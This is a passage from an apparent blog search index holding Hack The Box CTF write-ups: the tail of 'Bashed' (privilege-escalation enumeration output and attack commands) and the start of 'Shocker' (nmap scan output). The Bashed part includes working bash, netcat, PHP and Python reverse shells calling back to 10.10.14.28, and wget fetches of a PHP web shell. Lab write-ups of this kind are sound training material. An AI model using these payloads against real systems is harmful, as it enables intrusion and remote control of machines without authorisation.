670 Jan 18 2017 dev-hugepages.mount -rw-r--r-- 1 root root 624 Jan 18 2017 dev-mqueue.mount -rw-r--r-- 1 root root 431 Jan 18 2017 emergency.target -rw-r--r-- 1 root root 501 Jan 18 2017 exit.target -rw-r--r-- 1 root root 440 Jan 18 2017 final.target -rw-r--r-- 1 root root 460 Jan 18 2017 getty.target -rw-r--r-- 1 root root 558 Jan 18 2017 graphical.target -rw-r--r-- 1 root root 487 Jan 18 2017 halt.target -rw-r--r-- 1 root root 447 Jan 18 2017 hibernate.target -rw-r--r-- 1 root root 468 Jan 18 2017 hybrid-sleep.target -rw-r--r-- 1 root root 553 Jan 18 2017 initrd-fs.target -rw-r--r-- 1 root root 526 Jan 18 2017 initrd-root-fs.target -rw-r--r-- 1 root root 691 Jan 18 2017 initrd-switch-root.target -rw-r--r-- 1 root root 671 Jan 18 2017 initrd.target -rw-r--r-- 1 root root 501 Jan 18 2017 kexec.target -rw-r--r-- 1 root root 395 Jan 18 2017 local-fs-pre.target -rw-r--r-- 1 root root 507 Jan 18 2017 local-fs.target -rw-r--r-- 1 root root 405 Jan 18 2017 machine.slice -rw-r--r-- 1 root root 492 Jan 18 2017 multi-user.target -rw-r--r-- 1 root root 464 Jan 18 2017 network-online.target -rw-r--r-- 1 root root 461 Jan 18 2017 network-pre.target -rw-r--r-- 1 root root 480 Jan 18 2017 network.target -rw-r--r-- 1 root root 514 Jan 18 2017 nss-lookup.target -rw-r--r-- 1 root root 473 Jan 18 2017 nss-user-lookup.target -rw-r--r-- 1 root root 354 Jan 18 2017 paths.target -rw-r--r-- 1 root root 552 Jan 18 2017 poweroff.target -rw-r--r-- 1 root root 377 Jan 18 2017 printer.target -rw-r--r-- 1 root root 693 Jan 18 2017 proc-sys-fs-binfmt_misc.automount -rw-r--r-- 1 root root 603 Jan 18 2017 proc-sys-fs-binfmt_misc.mount -rw-r--r-- 1 root root 543 Jan 18 2017 reboot.target -rw-r--r-- 1 root root 396 Jan 18 2017 remote-fs-pre.target -rw-r--r-- 1 root root 482 Jan 18 2017 remote-fs.target -rw-r--r-- 1 root root 486 Jan 18 2017 rescue.target -rw-r--r-- 1 root root 500 Jan 18 2017 rpcbind.target -rw-r--r-- 1 root root 402 Jan 18 2017 shutdown.target -rw-r--r-- 1 root root 362 Jan 18 2017 sigpwr.target -rw-r--r-- 1 root root 420 Jan 18 2017 sleep.target -rw-r--r-- 1 root root 409 Jan 18 2017 slices.target -rw-r--r-- 1 root root 380 Jan 18 2017 smartcard.target -rw-r--r-- 1 root root 356 Jan 18 2017 sockets.target -rw-r--r-- 1 root root 380 Jan 18 2017 sound.target -rw-r--r-- 1 root root 441 Jan 18 2017 suspend.target -rw-r--r-- 1 root root 353 Jan 18 2017 swap.target -rw-r--r-- 1 root root 715 Jan 18 2017 sys-fs-fuse-connections.mount -rw-r--r-- 1 root root 719 Jan 18 2017 sys-kernel-config.mount -rw-r--r-- 1 root root 662 Jan 18 2017 sys-kernel-debug.mount -rw-r--r-- 1 root root 518 Jan 18 2017 sysinit.target -rw-r--r-- 1 root root 1.3K Jan 18 2017 syslog.socket -rw-r--r-- 1 root root 585 Jan 18 2017 system-update.target -rw-r--r-- 1 root root 436 Jan 18 2017 system.slice -rw-r--r-- 1 root root 646 Jan 18 2017 systemd-ask-password-console.path -rw-r--r-- 1 root root 574 Jan 18 2017 systemd-ask-password-wall.path -rw-r--r-- 1 root root 409 Jan 18 2017 systemd-bus-proxyd.socket -rw-r--r-- 1 root root 540 Jan 18 2017 systemd-fsckd.socket -rw-r--r-- 1 root root 524 Jan 18 2017 systemd-initctl.socket -rw-r--r-- 1 root root 607 Jan 18 2017 systemd-journald-audit.socket -rw-r--r-- 1 root root 1.1K Jan 18 2017 systemd-journald-dev-log.socket -rw-r--r-- 1 root root 842 Jan 18 2017 systemd-journald.socket -rw-r--r-- 1 root root 591 Jan 18 2017 systemd-networkd.socket -rw-r--r-- 1 root root 617 Jan 18 2017 systemd-rfkill.socket -rw-r--r-- 1 root root 450 Jan 18 2017 systemd-tmpfiles-clean.timer -rw-r--r-- 1 root root 578 Jan 18 2017 systemd-udevd-control.socket -rw-r--r-- 1 root root 570 Jan 18 2017 systemd-udevd-kernel.socket -rw-r--r-- 1 root root 395 Jan 18 2017 time-sync.target -rw-r--r-- 1 root root 405 Jan 18 2017 timers.target -rw-r--r-- 1 root root 417 Jan 18 2017 umount.target -rw-r--r-- 1 root root 392 Jan 18 2017 user.slice -rw-r--r-- 1 root root 663 Jan 18 2017 systemd-networkd-resolvconf-update.service -rw-r--r-- 1 root root 153 Jan 17 2017 apt-daily.service -rw-r--r-- 1 root root 162 Jan 17 2017 apt-daily.timer -rw-r--r-- 1 root root 342 Jan 13 2017 getty-static.service -rw-r--r-- 1 root root 153 Jan 13 2017 sigpwr-container-shutdown.service -rw-r--r-- 1 root root 152 Jan 13 2017 systemd-networkd-resolvconf-update.path -rw-r--r-- 1 root root 491 Jan 12 2017 dbus.service -rw-r--r-- 1 root root 106 Jan 12 2017 dbus.socket -rw-r--r-- 1 root root 189 Dec 16 2016 uuidd.service -rw-r--r-- 1 root root 126 Dec 16 2016 uuidd.socket -rw-r--r-- 1 root root 735 Nov 30 2016 networking.service -rw-r--r-- 1 root root 497 Nov 30 2016 ifup@.service -rw-r--r-- 1 root root 631 Nov 3 2016 accounts-daemon.service -rw-r--r-- 1 root root 251 Sep 17 2016 open-vm-tools.service -rw-r--r-- 1 root root 285 Jun 16 2016 keyboard-setup.service -rw-r--r-- 1 root root 288 Jun 16 2016 console-setup.service lrwxrwxrwx 1 root root 27 May 10 2016 plymouth-log.service -\u0026gt; plymouth-read-write.service lrwxrwxrwx 1 root root 21 May 10 2016 plymouth.service -\u0026gt; plymouth-quit.service -rw-r--r-- 1 root root 412 May 10 2016 plymouth-halt.service -rw-r--r-- 1 root root 426 May 10 2016 plymouth-kexec.service -rw-r--r-- 1 root root 421 May 10 2016 plymouth-poweroff.service -rw-r--r-- 1 root root 200 May 10 2016 plymouth-quit-wait.service -rw-r--r-- 1 root root 194 May 10 2016 plymouth-quit.service -rw-r--r-- 1 root root 244 May 10 2016 plymouth-read-write.service -rw-r--r-- 1 root root 416 May 10 2016 plymouth-reboot.service -rw-r--r-- 1 root root 532 May 10 2016 plymouth-start.service -rw-r--r-- 1 root root 291 May 10 2016 plymouth-switch-root.service -rw-r--r-- 1 root root 490 May 10 2016 systemd-ask-password-plymouth.path -rw-r--r-- 1 root root 467 May 10 2016 systemd-ask-password-plymouth.service drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel1.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel2.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel3.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel4.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel5.target.wants -rw-r--r-- 1 root root 251 Apr 5 2016 cron.service -rw-r--r-- 1 root root 290 Apr 5 2016 rsyslog.service -rw-r--r-- 1 root root 395 Jun 3 2015 resolvconf.service -rw-r--r-- 1 root root 790 Jun 1 2015 friendly-recovery.service -rw-r--r-- 1 root root 241 Mar 2 2015 ufw.service -rw-r--r-- 1 root root 250 Feb 24 2015 ureadahead-stop.service -rw-r--r-- 1 root root 242 Feb 24 2015 ureadahead-stop.timer -rw-r--r-- 1 root root 401 Feb 24 2015 ureadahead.service -rw-r--r-- 1 root root 188 Feb 24 2014 rsync.service /lib/systemd/system/apache2.service.d: total 4.0K -rw-r--r-- 1 root root 42 Apr 12 2016 apache2-systemd.conf /lib/systemd/system/halt.target.wants: total 0 lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-halt.service -\u0026gt; ../plymouth-halt.service /lib/systemd/system/initrd-switch-root.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service -\u0026gt; ../plymouth-start.service lrwxrwxrwx 1 root root 31 May 10 2016 plymouth-switch-root.service -\u0026gt; ../plymouth-switch-root.service /lib/systemd/system/kexec.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-kexec.service -\u0026gt; ../plymouth-kexec.service /lib/systemd/system/multi-user.target.wants: total 0 lrwxrwxrwx 1 root root 15 Dec 4 2017 getty.target -\u0026gt; ../getty.target lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-ask-password-wall.path -\u0026gt; ../systemd-ask-password-wall.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-logind.service -\u0026gt; ../systemd-logind.service lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-user-sessions.service -\u0026gt; ../systemd-user-sessions.service lrwxrwxrwx 1 root root 15 Jan 12 2017 dbus.service -\u0026gt; ../dbus.service lrwxrwxrwx 1 root root 29 May 10 2016 plymouth-quit-wait.service -\u0026gt; ../plymouth-quit-wait.service lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-quit.service -\u0026gt; ../plymouth-quit.service /lib/systemd/system/poweroff.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 28 May 10 2016 plymouth-poweroff.service -\u0026gt; ../plymouth-poweroff.service /lib/systemd/system/reboot.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 26 May 10 2016 plymouth-reboot.service -\u0026gt; ../plymouth-reboot.service /lib/systemd/system/sysinit.target.wants: total 0 lrwxrwxrwx 1 root root 24 Dec 4 2017 systemd-udevd.service -\u0026gt; ../systemd-udevd.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-update-utmp.service -\u0026gt; ../systemd-update-utmp.service lrwxrwxrwx 1 root root 24 Dec 4 2017 console-setup.service -\u0026gt; ../console-setup.service lrwxrwxrwx 1 root root 20 Dec 4 2017 cryptsetup.target -\u0026gt; ../cryptsetup.target lrwxrwxrwx 1 root root 22 Dec 4 2017 dev-hugepages.mount -\u0026gt; ../dev-hugepages.mount lrwxrwxrwx 1 root root 19 Dec 4 2017 dev-mqueue.mount -\u0026gt; ../dev-mqueue.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 keyboard-setup.service -\u0026gt; ../keyboard-setup.service lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod-static-nodes.service -\u0026gt; ../kmod-static-nodes.service lrwxrwxrwx 1 root root 36 Dec 4 2017 proc-sys-fs-binfmt_misc.automount -\u0026gt; ../proc-sys-fs-binfmt_misc.automount lrwxrwxrwx 1 root root 19 Dec 4 2017 setvtrgb.service -\u0026gt; ../setvtrgb.service lrwxrwxrwx 1 root root 32 Dec 4 2017 sys-fs-fuse-connections.mount -\u0026gt; ../sys-fs-fuse-connections.mount lrwxrwxrwx 1 root root 26 Dec 4 2017 sys-kernel-config.mount -\u0026gt; ../sys-kernel-config.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 sys-kernel-debug.mount -\u0026gt; ../sys-kernel-debug.mount lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-ask-password-console.path -\u0026gt; ../systemd-ask-password-console.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-binfmt.service -\u0026gt; ../systemd-binfmt.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-hwdb-update.service -\u0026gt; ../systemd-hwdb-update.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journal-flush.service -\u0026gt; ../systemd-journal-flush.service lrwxrwxrwx 1 root root 27 Dec 4 2017 systemd-journald.service -\u0026gt; ../systemd-journald.service lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-machine-id-commit.service -\u0026gt; ../systemd-machine-id-commit.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-modules-load.service -\u0026gt; ../systemd-modules-load.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-random-seed.service -\u0026gt; ../systemd-random-seed.service lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-sysctl.service -\u0026gt; ../systemd-sysctl.service lrwxrwxrwx 1 root root 37 Dec 4 2017 systemd-tmpfiles-setup-dev.service -\u0026gt; ../systemd-tmpfiles-setup-dev.service lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-tmpfiles-setup.service -\u0026gt; ../systemd-tmpfiles-setup.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udev-trigger.service -\u0026gt; ../systemd-udev-trigger.service lrwxrwxrwx 1 root root 30 May 10 2016 plymouth-read-write.service -\u0026gt; ../plymouth-read-write.service lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service -\u0026gt; ../plymouth-start.service /lib/systemd/system/sockets.target.wants: total 0 lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-initctl.socket -\u0026gt; ../systemd-initctl.socket lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journald-audit.socket -\u0026gt; ../systemd-journald-audit.socket lrwxrwxrwx 1 root root 34 Dec 4 2017 systemd-journald-dev-log.socket -\u0026gt; ../systemd-journald-dev-log.socket lrwxrwxrwx 1 root root 26 Dec 4 2017 systemd-journald.socket -\u0026gt; ../systemd-journald.socket lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udevd-control.socket -\u0026gt; ../systemd-udevd-control.socket lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-udevd-kernel.socket -\u0026gt; ../systemd-udevd-kernel.socket lrwxrwxrwx 1 root root 14 Jan 12 2017 dbus.socket -\u0026gt; ../dbus.socket /lib/systemd/system/timers.target.wants: total 0 lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-tmpfiles-clean.timer -\u0026gt; ../systemd-tmpfiles-clean.timer /lib/systemd/system/systemd-timesyncd.service.d: total 4.0K -rw-r--r-- 1 root root 251 Jan 12 2017 disable-with-time-daemon.conf /lib/systemd/system/sigpwr.target.wants: total 0 lrwxrwxrwx 1 root root 36 Dec 4 2017 sigpwr-container-shutdown.service -\u0026gt; ../sigpwr-container-shutdown.service /lib/systemd/system/rescue.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service /lib/systemd/system/resolvconf.service.wants: total 0 lrwxrwxrwx 1 root root 42 Dec 4 2017 systemd-networkd-resolvconf-update.path -\u0026gt; ../systemd-networkd-resolvconf-update.path /lib/systemd/system/rc-local.service.d: total 4.0K -rw-r--r-- 1 root root 290 Jan 12 2017 debian.conf /lib/systemd/system/graphical.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service -\u0026gt; ../systemd-update-utmp-runlevel.service /lib/systemd/system/local-fs.target.wants: total 0 lrwxrwxrwx 1 root root 29 Dec 4 2017 systemd-remount-fs.service -\u0026gt; ../systemd-remount-fs.service /lib/systemd/system/getty.target.wants: total 0 lrwxrwxrwx 1 root root 23 Dec 4 2017 getty-static.service -\u0026gt; ../getty-static.service /lib/systemd/system/busnames.target.wants: total 0 /lib/systemd/system/runlevel1.target.wants: total 0 /lib/systemd/system/runlevel2.target.wants: total 0 /lib/systemd/system/runlevel3.target.wants: total 0 /lib/systemd/system/runlevel4.target.wants: total 0 /lib/systemd/system/runlevel5.target.wants: total 0 /lib/systemd/system-sleep: total 4.0K -rwxr-xr-x 1 root root 92 Mar 17 2016 hdparm /lib/systemd/system-preset: total 4.0K -rw-r--r-- 1 root root 869 Jan 18 2017 90-systemd.preset /lib/systemd/system-generators: total 668K -rwxr-xr-x 1 root root 59K Jan 18 2017 systemd-dbus1-generator -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-cryptsetup-generator -rwxr-xr-x 1 root root 43K Jan 18 2017 systemd-debug-generator -rwxr-xr-x 1 root root 79K Jan 18 2017 systemd-fstab-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-getty-generator -rwxr-xr-x 1 root root 119K Jan 18 2017 systemd-gpt-auto-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-hibernate-resume-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-insserv-generator -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-rc-local-generator -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-system-update-generator -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-sysv-generator /lib/systemd/network: total 12K -rw-r--r-- 1 root root 404 Jan 18 2017 80-container-host0.network -rw-r--r-- 1 root root 482 Jan 18 2017 80-container-ve.network -rw-r--r-- 1 root root 80 Jan 18 2017 99-default.link /lib/systemd/system-shutdown: total 0 [00;33m### SOFTWARE #############################################[00m [00;31m[-] Sudo version:[00m Sudo version 1.8.16 [00;31m[-] Apache version:[00m Server version: Apache/2.4.18 (Ubuntu) Server built: 2017-09-18T15:09:02 [00;31m[-] Apache user configuration:[00m APACHE_RUN_USER=www-data APACHE_RUN_GROUP=www-data [00;31m[-] Installed Apache modules:[00m Loaded Modules: core_module (static) so_module (static) watchdog_module (static) http_module (static) log_config_module (static) logio_module (static) version_module (static) unixd_module (static) access_compat_module (shared) alias_module (shared) auth_basic_module (shared) authn_core_module (shared) authn_file_module (shared) authz_core_module (shared) authz_host_module (shared) authz_user_module (shared) autoindex_module (shared) deflate_module (shared) dir_module (shared) env_module (shared) filter_module (shared) mime_module (shared) mpm_prefork_module (shared) negotiation_module (shared) php7_module (shared) setenvif_module (shared) status_module (shared) [00;33m### INTERESTING FILES ####################################[00m [00;31m[-] Useful file locations:[00m /bin/nc /bin/netcat /usr/bin/wget [00;31m[-] Can we read/write sensitive files:[00m -rw-r--r-- 1 root root 1482 Dec 4 2017 /etc/passwd -rw-r--r-- 1 root root 820 Dec 4 2017 /etc/group -rw-r--r-- 1 root root 575 Oct 22 2015 /etc/profile -rw-r----- 1 root shadow 933 Dec 4 2017 /etc/shadow [00;31m[-] SUID files:[00m -rwsr-xr-x 1 root root 40152 Dec 16 2016 /bin/mount -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40128 Mar 29 2016 /bin/su -rwsr-xr-x 1 root root 27608 Dec 16 2016 /bin/umount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 40432 Mar 29 2016 /usr/bin/chsh -rwsr-xr-x 1 root root 39904 Mar 29 2016 /usr/bin/newgrp -rwsr-xr-x 1 root root 136808 Jan 20 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 49584 Mar 29 2016 /usr/bin/chfn -rwsr-xr-x 1 root root 54256 Mar 29 2016 /usr/bin/passwd -rwsr-xr-x 1 root root 75304 Mar 29 2016 /usr/bin/gpasswd -rwsr-xr-x 1 root root 10624 Feb 9 2017 /usr/bin/vmware-user-suid-wrapper -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10240 Feb 25 2014 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 428240 Aug 11 2016 /usr/lib/openssh/ssh-keysign [00;31m[-] SGID files:[00m -rwxr-sr-x 1 root shadow 35632 Mar 16 2016 /sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 35600 Mar 16 2016 /sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 22768 Mar 29 2016 /usr/bin/expiry -rwxr-sr-x 1 root crontab 36080 Apr 5 2016 /usr/bin/crontab -rwxr-sr-x 1 root ssh 358624 Aug 11 2016 /usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 62336 Mar 29 2016 /usr/bin/chage -rwxr-sr-x 1 root tty 27368 Dec 16 2016 /usr/bin/wall -rwxr-sr-x 1 root tty 14752 Mar 1 2016 /usr/bin/bsd-write -rwxr-sr-x 1 root mlocate 39520 Nov 17 2014 /usr/bin/mlocate [00;31m[+] Files with POSIX capabilities set:[00m /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep /usr/bin/mtr = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep [-] Can\u0026#39;t search *.conf files as no keyword was entered [-] Can\u0026#39;t search *.php files as no keyword was entered [-] Can\u0026#39;t search *.log files as no keyword was entered [-] Can\u0026#39;t search *.ini files as no keyword was entered [00;31m[-] All *.conf files in /etc (recursive 1 level):[00m -rw-r--r-- 1 root root 703 May 5 2015 /etc/logrotate.conf -rw-r--r-- 1 root root 604 Jul 2 2015 /etc/deluser.conf -rw-r--r-- 1 root root 497 May 4 2014 /etc/nsswitch.conf -rw-r--r-- 1 root root 14867 Apr 11 2016 /etc/ltrace.conf -rw-r--r-- 1 root root 7788 Dec 4 2017 /etc/ca-certificates.conf -rw-r--r-- 1 root root 552 Mar 16 2016 /etc/pam.conf -rw-r--r-- 1 root root 2084 Sep 5 2015 /etc/sysctl.conf -rw-r--r-- 1 root root 338 Nov 17 2014 /etc/updatedb.conf -rw-r--r-- 1 root root 1260 Mar 16 2016 /etc/ucf.conf -rw-r--r-- 1 root root 2584 Feb 18 2016 /etc/gai.conf -rw-r--r-- 1 root root 4781 Mar 17 2016 /etc/hdparm.conf -rw-r--r-- 1 root root 967 Oct 30 2015 /etc/mke2fs.conf -rw-r--r-- 1 root root 3028 Feb 15 2017 /etc/adduser.conf -rw-r--r-- 1 root root 771 Mar 6 2015 /etc/insserv.conf -rw-r--r-- 1 root root 2969 Nov 10 2015 /etc/debconf.conf -rw-r--r-- 1 root root 92 Oct 22 2015 /etc/host.conf -rw-r--r-- 1 root root 191 Jan 18 2016 /etc/libaudit.conf -rw-r--r-- 1 root root 144 Dec 4 2017 /etc/kernel-img.conf -rw-r--r-- 1 root root 34 Jan 27 2016 /etc/ld.so.conf -rw-r--r-- 1 root root 1371 Jan 27 2016 /etc/rsyslog.conf -rw-r--r-- 1 root root 280 Jun 19 2014 /etc/fuse.conf -rw-r--r-- 1 root root 350 Dec 4 2017 /etc/popularity-contest.conf [00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m /home/scriptmanager/.bash_history /home/arrexel/.bash_history [00;31m[-] Location and Permissions (if accessible) of .bak file(s):[00m -rw-r--r-- 1 root root 3024 Dec 4 2017 /etc/apt/sources.bak [00;31m[-] Any interesting mail in /var/mail:[00m total 8 drwxrwsr-x 2 root mail 4096 Feb 15 2017 . drwxr-xr-x 12 root root 4096 Dec 4 2017 .. [00;33m### SCAN COMPLETE ####################################[00m   1  sudo -u scriptmanager whoami # in /dev/phpbash.php || # Not really persistent setup a reverse shell   1 2 3  nc -lvnp 8081 bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/8081 0\u0026gt;\u0026amp;1 # No success || # Bash reverse shell from pentestmonkey   1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.28 8081 \u0026gt;/tmp/f # Netcat reverse shell from pentestmonkey   1  php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.20\u0026#34;,8081);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; # No hi   1 2 3  cd /var/www/html cd uploads touch test   Privilege Escalation 1 2 3 4 5 6 7 8 9 10 11  locate php-reverse-shell.php cp /usr/share/webshells/php/php-reverse-shell.php ./ # Modify the php-reverse-shell.php IP and PORT wget 10.10.14.28/php-reverse-shell.php python -c \u0026#39;import pty;pty.spawn(\u0026#34;bin/bash\u0026#34;)\u0026#39; sudo -u scriptmanager bash   1  ls -al   1 2 3 4 5 6 7 8 9 10  # Create this on local machine  # test1.py ------------------------------------------------ import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026#34;10.10.14.28\u0026#34;,1234)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;])    import this file to the reversed shell machine  1  wget http://10.10.14.28:80/test1.py ./   1 2 3 4 5 6 7 8 9  # Attacking machine nc -lvnp 1234 python test1.py rm test.py # Soon you will get root cat root.txt - Ans: ********************************    User arrexel flag  1 2 3  cd /home/arrexel cat user.txt - Ans: ********************************   Skills Learned  Basic web fuzzing techniques Locating recently modified files  ","description":"Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.","id":20,"section":"posts","tags":["OSCP","linux","os command injection","sudo","metasploit","apache"],"title":"Hackthebox - Bashed","uri":"https://hswootan.github.io/en/posts/bashed/"},{"content":"\r\rEnumeration 1  nmap -sC -sV -O -Pn -vv 10.10.10.56 -oA shocker # Using -Pn because it is blocking ping probes   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 22:32 EST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Initiating Parallel DNS resolution of 1 host. at 22:32 Completed Parallel DNS resolution of 1 host. at 22:32, 0.01s elapsed Initiating SYN Stealth Scan at 22:32 Scanning 10.10.10.56 [1000 ports] Discovered open port 80/tcp on 10.10.10.56 Discovered open port 2222/tcp on 10.10.10.56 Completed SYN Stealth Scan at 22:32, 0.36s elapsed (1000 total ports) Initiating Service scan at 22:32 Scanning 2 services on 10.10.10.56 Completed Service scan at 22:32, 6.04s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.10.56 Retrying OS detection (try #2) against 10.10.10.56 Retrying OS detection (try #3) against 10.10.10.56 Retrying OS detection (try #4) against 10.10.10.56 Retrying OS detection (try #5) against 10.10.10.56 NSE: Script scanning 10.10.10.56. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.75s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.08s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:32 Completed NSE at 22:32, 0.00s elapsed Nmap scan report for 10.10.10.56 Host is up, received user-set (0.017s latency). Scanned at 2022-02-06 22:32:08 EST for 18s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/6%OT=80%CT=1%CU=33894%PV=Y%DS=2%DC=I%G=Y%TM=620092CA OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11 